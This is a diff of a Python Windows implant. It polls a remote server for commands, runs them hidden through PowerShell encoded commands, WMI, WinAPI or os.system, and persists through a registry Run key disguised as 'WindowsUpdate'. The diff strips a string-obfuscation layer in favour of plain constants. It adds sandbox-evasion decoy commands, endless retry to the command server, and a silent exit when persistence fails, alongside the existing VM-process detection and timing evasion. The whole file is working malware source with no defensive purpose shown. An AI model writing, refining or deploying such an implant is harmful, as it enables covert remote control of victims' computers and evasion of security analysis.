@@ -11,333 +11,41 @@ import random
 import ctypes
 from ctypes import wintypes
 from enum import IntEnum, Enum
-from typing import Optional, List, Tuple
 
-_BUILD_CONFIG = {
-    "prefix_offset": 0x41,
-    "suffix_offset": 0x5A,
-    "xor_key": 0x42,
-    "split_count": 3,
-    "encoding_version": 2,
-}
+# String constants (replacing obfuscated strings)
+REGISTRY_RUN_KEY = r"Software\Microsoft\Windows\CurrentVersion\Run"
+REGISTRY_VALUE_NAME = "WindowsUpdate"
+USER_AGENT = "RemoteCmdExec/1.0"
+CONNECTION = "close"
+POWERSHELL = "powershell"
+POWERSHELL_WINDOW_STYLE = "-WindowStyle"
+POWERSHELL_HIDDEN = "Hidden"
+POWERSHELL_ENCODED_COMMAND = "-EncodedCommand"
+WMI_COMMAND_TEMPLATE = 'wmic process call create "{command}"'
+REDIRECT_OUTPUT = ">nul 2>&1"
+UTF8 = "utf-8"
+UTF16LE = "utf-16le"
+JSON_COMMAND_KEY = "command"
+TASKLIST = "tasklist"
 
+VM_PROCESSES = ["vmtoolsd", "vmwaretray", "vmwareuser", "vboxservice", "vboxtray"]
 
-class TransformEncoder:
-    def __init__(self, encoded_data: bytes, transform_type: str = "base64"):
-        self._encoded_data = encoded_data
-        self._transform_type = transform_type
-        self._decoded: Optional[str] = None
-
-    @classmethod
-    def encode(cls, plaintext: str, transform_type: str = "base64"):
-        if transform_type == "base64":
-            encoded = base64.b64encode(plaintext.encode("utf-8"))
-        elif transform_type == "xor":
-            key = _BUILD_CONFIG["xor_key"]
-            encoded = bytes(b ^ key for b in plaintext.encode("utf-8"))
-        else:
-            raise ValueError(f"Unknown transform type: {transform_type}")
-        return cls(encoded, transform_type)
-
-    def decode(self) -> str:
-        if self._decoded is not None:
-            return self._decoded
-
-        if self._transform_type == "base64":
-            self._decoded = base64.b64decode(self._encoded_data).decode("utf-8")
-        elif self._transform_type == "xor":
-            key = _BUILD_CONFIG["xor_key"]
-            self._decoded = bytes(b ^ key for b in self._encoded_data).decode("utf-8")
-        else:
-            raise ValueError(f"Unknown transform type: {self._transform_type}")
-
-        return self._decoded
-
-
-class SplitReassembleEncoder:
-    def __init__(self, fragments: List[str]):
-        self._fragments = fragments
-
-    @classmethod
-    def encode(cls, plaintext: str, num_splits: int = None):
-        if num_splits is None:
-            num_splits = _BUILD_CONFIG["split_count"]
-
-        fragment_size = len(plaintext) // num_splits
-        fragments = []
-        start = 0
-
-        for i in range(num_splits - 1):
-            end = start + fragment_size
-            fragments.append(plaintext[start:end])
-            start = end
-
-        fragments.append(plaintext[start:])
-        return cls(fragments)
-
-    def decode(self) -> str:
-        return "".join(self._fragments)
-
-
-class DerivedStringEncoder:
-    def __init__(self, derivation_method: str, params: Tuple):
-        self._derivation_method = derivation_method
-        self._params = params
-        self._cached: Optional[str] = None
-
-    @classmethod
-    def from_lookup_table(cls, indices: List[int], table: List[int]):
-        return cls("lookup_table", (indices, table))
-
-    def decode(self) -> str:
-        if self._cached is not None:
-            return self._cached
-
-        if self._derivation_method == "lookup_table":
-            indices, table = self._params
-            chars = [chr(table[i]) for i in indices]
-            self._cached = "".join(chars)
-        else:
-            raise ValueError(f"Unknown derivation method: {self._derivation_method}")
-
-        return self._cached
-
-
-class LazyDecoder:
-    def __init__(self, encoded_data: bytes, decoder_func):
-        self._encoded_data = encoded_data
-        self._decoder_func = decoder_func
-        self._decoded: Optional[str] = None
-
-    @property
-    def value(self) -> str:
-        if self._decoded is None:
-            self._decoded = self._decoder_func(self._encoded_data)
-        return self._decoded
-
-
-class MultiRepresentationEncoder:
-    def __init__(self, representations: dict):
-        self._representations = representations
-        self._selected: Optional[str] = None
-
-    @classmethod
-    def encode(cls, plaintext: str):
-        representations = {
-            "base64": base64.b64encode(plaintext.encode("utf-8")).decode("ascii"),
-            "hex": plaintext.encode("utf-8").hex(),
-            "xor": "".join(chr(ord(c) ^ _BUILD_CONFIG["xor_key"]) for c in plaintext),
-        }
-        return cls(representations)
-
-    def decode(self, representation: Optional[str] = None) -> str:
-        if representation is None:
-            representation = random.choice(list(self._representations.keys()))
-        self._selected = representation
-
-        encoded = self._representations[representation]
-
-        if representation == "base64":
-            return base64.b64decode(encoded.encode("ascii")).decode("utf-8")
-        elif representation == "hex":
-            return bytes.fromhex(encoded).decode("utf-8")
-        elif representation == "xor":
-            key = _BUILD_CONFIG["xor_key"]
-            return "".join(chr(ord(c) ^ key) for c in encoded)
-        else:
-            raise ValueError(f"Unknown representation: {representation}")
-
-
-class ControlFlowEncoder:
-    def __init__(self, construction_logic: str, params: dict):
-        self._construction_logic = construction_logic
-        self._params = params
-        self._cached: Optional[str] = None
-
-    @classmethod
-    def encode(cls, plaintext: str, branch_count: int = 3):
-        return cls("branching", {"plaintext": plaintext, "branch_count": branch_count})
-
-    def decode(self, branch_selector: Optional[int] = None) -> str:
-        if self._cached is not None:
-            return self._cached
-
-        if self._construction_logic == "branching":
-            plaintext = self._params["plaintext"]
-            branch_count = self._params["branch_count"]
-
-            if branch_selector is None:
-                branch_selector = random.randint(0, branch_count - 1)
-
-            result = ""
-            for i, char in enumerate(plaintext):
-                branch = (i + branch_selector) % branch_count
-
-                if branch == 0:
-                    result += char
-                elif branch == 1:
-                    result += chr(ord(char) ^ 0)
-                elif branch == 2:
-                    temp = ord(char)
-                    temp = temp | 0
-                    result += chr(temp)
-                else:
-                    result += char
-
-            self._cached = result
-        else:
-            raise ValueError(f"Unknown construction logic: {self._construction_logic}")
-
-        return self._cached
-
-
-class ExternalizedEncoder:
-    def __init__(self, base_string: str, derivation_config: dict):
-        self._base_string = base_string
-        self._derivation_config = derivation_config
-        self._cached: Optional[str] = None
-
-    @classmethod
-    def encode(cls, plaintext: str):
-        return cls(plaintext, _BUILD_CONFIG.copy())
-
-    def decode(self) -> str:
-        if self._cached is not None:
-            return self._cached
-
-        prefix_char = chr(self._derivation_config["prefix_offset"])
-        suffix_char = chr(self._derivation_config["suffix_offset"])
-
-        self._cached = f"{prefix_char}{self._base_string}{suffix_char}"
-        return self._cached
-
-
-class WipeableString:
-    def __init__(self, value: str):
-        self._value = value
-        self._wiped = False
-
-    def __enter__(self):
-        return self
-
-    def __exit__(self, exc_type, exc_val, exc_tb):
-        self.wipe()
-        return False
-
-    def get(self) -> str:
-        if self._wiped:
-            raise ValueError("String has been wiped")
-        return self._value
-
-    def wipe(self):
-        if not self._wiped:
-            self._value = "\x00" * len(self._value)
-            self._wiped = True
-
-    def is_wiped(self) -> bool:
-        return self._wiped
-
-
-class DecoyStringManager:
-    def __init__(self, real_string: str, decoy_strings: List[str]):
-        self._real_string = real_string
-        self._decoy_strings = decoy_strings
-        self._all_strings = [real_string] + decoy_strings
-        random.shuffle(self._all_strings)
-
-    @classmethod
-    def encode(cls, plaintext: str, num_decoys: int = 3):
-        decoys = [
-            "API_KEY_PLACEHOLDER",
-            "SECRET_TOKEN_EXAMPLE",
-            "DATABASE_PASSWORD_DEMO",
-            "ENCRYPTION_KEY_SAMPLE",
-            "AUTH_TOKEN_TEMPLATE",
-        ][:num_decoys]
-        return cls(plaintext, decoys)
-
-    def get_real(self) -> str:
-        return self._real_string
-
-
-_OBFUSCATED_STRINGS = {
-    "registry_run_key": SplitReassembleEncoder.encode(
-        r"Software\Microsoft\Windows\CurrentVersion\Run"
-    ),
-    "registry_value_name": MultiRepresentationEncoder.encode("WindowsUpdate"),
-    "user_agent": TransformEncoder.encode("RemoteCmdExec/1.0", "base64"),
-    "connection": ControlFlowEncoder.encode("close"),
-    "powershell": DerivedStringEncoder.from_lookup_table(
-        list(range(10)), [112, 111, 119, 101, 114, 115, 104, 101, 108, 108]
-    ),
-    "powershell_window_style": ExternalizedEncoder.encode("-WindowStyle"),
-    "powershell_hidden": LazyDecoder(
-        base64.b64encode("Hidden".encode("utf-8")),
-        lambda x: base64.b64decode(x).decode("utf-8"),
-    ),
-    "powershell_encoded_command": MultiRepresentationEncoder.encode("-EncodedCommand"),
-    "wmi_command_template": SplitReassembleEncoder.encode('wmic process call create "{command}"'),
-    "redirect_output": ControlFlowEncoder.encode(">nul 2>&1"),
-    "utf8": TransformEncoder.encode("utf-8", "xor"),
-    "utf16le": DerivedStringEncoder.from_lookup_table(
-        list(range(8)), [117, 116, 102, 45, 49, 54, 108, 101]
-    ),
-    "json_command_key": MultiRepresentationEncoder.encode("command"),
-    "tasklist": ControlFlowEncoder.encode("tasklist"),
-}
-
-_VM_PROCESSES_OBFUSCATED = [
-    TransformEncoder.encode("vmtoolsd", "base64"),
-    SplitReassembleEncoder.encode("vmwaretray"),
-    MultiRepresentationEncoder.encode("vmwareuser"),
-    ControlFlowEncoder.encode("vboxservice"),
-    DerivedStringEncoder.from_lookup_table(
-        list(range(8)), [118, 98, 111, 120, 116, 114, 97, 121]
-    ),
+# Decoy commands for sandbox evasion
+DECOY_COMMANDS = [
+    'echo "Windows Update"',
+    "dir %TEMP%",
+    "whoami",
+    "hostname",
+    'systeminfo | findstr /B /C:"OS Name"',
 ]
 
+# Network retry configuration
+FIXED_RETRY_DELAY = 5.0  # seconds
 
-def _get_string(key: str) -> str:
-    if key not in _OBFUSCATED_STRINGS:
-        raise ValueError(f"Unknown string key: {key}")
-
-    encoder = _OBFUSCATED_STRINGS[key]
-    if isinstance(encoder, TransformEncoder):
-        return encoder.decode()
-    elif isinstance(encoder, SplitReassembleEncoder):
-        return encoder.decode()
-    elif isinstance(encoder, DerivedStringEncoder):
-        return encoder.decode()
-    elif isinstance(encoder, LazyDecoder):
-        return encoder.value
-    elif isinstance(encoder, MultiRepresentationEncoder):
-        return encoder.decode()
-    elif isinstance(encoder, ControlFlowEncoder):
-        return encoder.decode()
-    elif isinstance(encoder, ExternalizedEncoder):
-        result = encoder.decode()
-        return result[1:-1]
-    else:
-        raise ValueError(f"Unknown encoder type: {type(encoder)}")
+# Internal error log (in-memory only)
+_error_log = []
 
 
-def _get_vm_processes() -> List[str]:
-    result = []
-    for encoder in _VM_PROCESSES_OBFUSCATED:
-        if isinstance(encoder, TransformEncoder):
-            result.append(encoder.decode())
-        elif isinstance(encoder, SplitReassembleEncoder):
-            result.append(encoder.decode())
-        elif isinstance(encoder, MultiRepresentationEncoder):
-            result.append(encoder.decode())
-        elif isinstance(encoder, ControlFlowEncoder):
-            result.append(encoder.decode())
-        elif isinstance(encoder, DerivedStringEncoder):
-            result.append(encoder.decode())
-        elif isinstance(encoder, ExternalizedEncoder):
-            decoded = encoder.decode()
-            result.append(decoded[1:-1])
-    return result
 
 
 class Config:
@@ -376,80 +84,41 @@ class Config:
         ERROR_SUCCESS = 0
 
     class RegistryPath:
-        @staticmethod
-        def RUN_KEY():
-            return _get_string("registry_run_key")
-
-        @staticmethod
-        def VALUE_NAME():
-            return _get_string("registry_value_name")
+        RUN_KEY = REGISTRY_RUN_KEY
+        VALUE_NAME = REGISTRY_VALUE_NAME
 
     class Sandbox:
-        @staticmethod
-        def VM_PROCESSES():
-            return _get_vm_processes()
+        VM_PROCESSES = VM_PROCESSES
 
     class Network:
-        @staticmethod
-        def USER_AGENT():
-            return _get_string("user_agent")
-
-        @staticmethod
-        def CONNECTION():
-            return _get_string("connection")
+        USER_AGENT = USER_AGENT
+        CONNECTION = CONNECTION
 
     class Execution:
-        @staticmethod
-        def POWERSHELL():
-            return _get_string("powershell")
-
-        @staticmethod
-        def POWERSHELL_WINDOW_STYLE():
-            return _get_string("powershell_window_style")
-
-        @staticmethod
-        def POWERSHELL_HIDDEN():
-            return _get_string("powershell_hidden")
-
-        @staticmethod
-        def POWERSHELL_ENCODED_COMMAND():
-            return _get_string("powershell_encoded_command")
+        POWERSHELL = POWERSHELL
+        POWERSHELL_WINDOW_STYLE = POWERSHELL_WINDOW_STYLE
+        POWERSHELL_HIDDEN = POWERSHELL_HIDDEN
+        POWERSHELL_ENCODED_COMMAND = POWERSHELL_ENCODED_COMMAND
 
         @staticmethod
         def WMI_COMMAND(command: str):
-            template = _get_string("wmi_command_template")
-            return template.replace("{command}", command)
+            return WMI_COMMAND_TEMPLATE.replace("{command}", command)
 
-        @staticmethod
-        def REDIRECT_OUTPUT():
-            return _get_string("redirect_output")
+        REDIRECT_OUTPUT = REDIRECT_OUTPUT
 
     class Encoding:
-        @staticmethod
-        def UTF8():
-            return _get_string("utf8")
-
-        @staticmethod
-        def UTF16LE():
-            return _get_string("utf16le")
+        UTF8 = UTF8
+        UTF16LE = UTF16LE
 
     class JSONKey:
-        @staticmethod
-        def COMMAND():
-            return _get_string("json_command_key")
+        COMMAND = JSON_COMMAND_KEY
 
 
-def obfuscate_command(command):
-    encoded = base64.b64encode(command.encode(Config.Encoding.UTF8())).decode(
-        Config.Encoding.UTF8()
-    )
-    return encoded
 
 
-def deobfuscate_command(obfuscated):
-    return base64.b64decode(obfuscated.encode(Config.Encoding.UTF8())).decode(
-        Config.Encoding.UTF8()
-    )
+def get_decoy_command() -> str:
+    """Return a randomly selected decoy command."""
+    return random.choice(DECOY_COMMANDS)
 
 
 def is_sandbox_environment():
@@ -466,15 +135,15 @@ def is_sandbox_environment():
         return True
 
     result = subprocess.run(
-        [_get_string("tasklist")],
+        [TASKLIST],
         shell=True,
         stdout=subprocess.PIPE,
         stderr=subprocess.DEVNULL,
         timeout=Config.Timeout.SANDBOX_CHECK,
     )
     if result.returncode == 0:
-        output = result.stdout.decode(Config.Encoding.UTF8(), errors="ignore").lower()
-        for vm_proc in Config.Sandbox.VM_PROCESSES():
+        output = result.stdout.decode(UTF8, errors="ignore").lower()
+        for vm_proc in Config.Sandbox.VM_PROCESSES:
             if vm_proc in output:
                 return True
 
@@ -580,10 +249,8 @@ def execute_via_powershell(command):
     if not Config.IS_WINDOWS:
         return False
 
-    encoded_cmd = base64.b64encode(command.encode(Config.Encoding.UTF16LE())).decode(
-        Config.Encoding.UTF8()
-    )
-    ps_command = f"{Config.Execution.POWERSHELL()} {Config.Execution.POWERSHELL_WINDOW_STYLE()} {Config.Execution.POWERSHELL_HIDDEN()} {Config.Execution.POWERSHELL_ENCODED_COMMAND()} {encoded_cmd}"
+    encoded_cmd = base64.b64encode(command.encode(UTF16LE)).decode(UTF8)
+    ps_command = f"{Config.Execution.POWERSHELL} {Config.Execution.POWERSHELL_WINDOW_STYLE} {Config.Execution.POWERSHELL_HIDDEN} {Config.Execution.POWERSHELL_ENCODED_COMMAND} {encoded_cmd}"
 
     subprocess.run(
         ps_command,
@@ -599,7 +266,7 @@ def execute_via_os_system(command):
     old_path = os.environ.get("PATH", "")
     os.environ["PATH"] = old_path
 
-    os.system(f"{command} {Config.Execution.REDIRECT_OUTPUT()}")
+    os.system(f"{command} {Config.Execution.REDIRECT_OUTPUT}")
     return True
 
 
@@ -684,7 +351,7 @@ def is_persisted():
     h_key = wintypes.HKEY()
     result = RegOpenKeyExW(
         Config.Registry.HKEY_CURRENT_USER,
-        Config.RegistryPath.RUN_KEY(),
+        Config.RegistryPath.RUN_KEY,
         0,
         Config.Registry.KEY_READ,
         ctypes.byref(h_key),
@@ -696,7 +363,7 @@ def is_persisted():
     dw_type = wintypes.DWORD()
     dw_size = wintypes.DWORD(0)
 
-    value_name_wide = Config.RegistryPath.VALUE_NAME().encode(Config.Encoding.UTF16LE()) + b"\x00\x00"
+    value_name_wide = Config.RegistryPath.VALUE_NAME.encode(UTF16LE) + b"\x00\x00"
 
     result = RegQueryValueExW(
         h_key, value_name_wide, None, ctypes.byref(dw_type), None, ctypes.byref(dw_size)
@@ -756,7 +423,7 @@ def install_persistence():
 
     result = RegCreateKeyExW(
         Config.Registry.HKEY_CURRENT_USER,
-        Config.RegistryPath.RUN_KEY(),
+        Config.RegistryPath.RUN_KEY,
         0,
         None,
         Config.Registry.REG_OPTION_NON_VOLATILE,
@@ -769,9 +436,9 @@ def install_persistence():
     if result != Config.Registry.ERROR_SUCCESS:
         return
 
-    value_data = exe_path_with_args.encode(Config.Encoding.UTF16LE()) + b"\x00\x00"
+    value_data = exe_path_with_args.encode(UTF16LE) + b"\x00\x00"
     value_size = len(value_data)
-    value_name_wide = Config.RegistryPath.VALUE_NAME().encode(Config.Encoding.UTF16LE()) + b"\x00\x00"
+    value_name_wide = Config.RegistryPath.VALUE_NAME.encode(UTF16LE) + b"\x00\x00"
 
     value_buffer = ctypes.create_string_buffer(value_data)
 
@@ -794,27 +461,48 @@ def setup_persistence():
     if is_persisted():
         return
 
-    install_persistence()
+    # Try to install persistence, exit silently if it fails
+    try:
+        install_persistence()
+    except Exception:
+        # Exit silently if persistence installation fails
+        sys.exit(0)
 
 
 def fetch_command_from_server(server, port=80):
     url = f"http://{server}:{port}/"
     req = urllib.request.Request(url)
-    req.add_header("User-Agent", Config.Network.USER_AGENT())
-    req.add_header("Connection", Config.Network.CONNECTION())
+    req.add_header("User-Agent", Config.Network.USER_AGENT)
+    req.add_header("Connection", Config.Network.CONNECTION)
 
-    with urllib.request.urlopen(req, timeout=Config.Timeout.HTTP_REQUEST) as response:
-        response_data = response.read().decode(Config.Encoding.UTF8())
-        return json.loads(response_data)
+    # Retry indefinitely with fixed delay on network failures
+    while True:
+        try:
+            with urllib.request.urlopen(req, timeout=Config.Timeout.HTTP_REQUEST) as response:
+                response_data = response.read().decode(UTF8)
+                return json.loads(response_data)
+        except (urllib.error.URLError, urllib.error.HTTPError, TimeoutError, json.JSONDecodeError, KeyError):
+            time.sleep(FIXED_RETRY_DELAY)
+            continue
 
 
 def execute_command(command):
     if is_sandbox_environment():
+        # Execute decoy command instead of real command
+        decoy = get_decoy_command()
+        execution_methods = [
+            execute_via_winapi,
+            execute_via_powershell,
+            execute_via_wmi,
+            execute_via_subprocess_hidden,
+            execute_via_os_system,
+        ]
+        for method in execution_methods:
+            if method(decoy):
+                return
         return
 
     timing_evasion()
-
-    obfuscated = obfuscate_command(command)
 
     execution_methods = [
         execute_via_winapi,
@@ -828,6 +516,8 @@ def execute_command(command):
         if method(command):
             return
 
+    # All methods failed - log error internally and continue
+    _error_log.append(f"Command execution failed: {command}")
     subprocess.run(
         command,
         shell=True,
@@ -844,7 +534,7 @@ def main():
     port = int(sys.argv[2])
 
     command_data = fetch_command_from_server(server, port)
-    command = command_data[Config.JSONKey.COMMAND()]
+    command = command_data[Config.JSONKey.COMMAND]
 
     execute_command(command)
 
